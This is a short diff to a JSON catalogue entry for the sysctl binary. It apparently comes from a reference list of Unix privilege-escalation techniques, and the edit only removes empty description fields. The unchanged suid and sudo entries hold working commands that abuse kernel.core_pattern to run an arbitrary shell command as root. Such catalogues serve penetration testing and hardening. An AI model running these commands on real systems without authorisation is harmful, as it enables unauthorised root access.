@@ -14,13 +14,13 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
       }
     ]
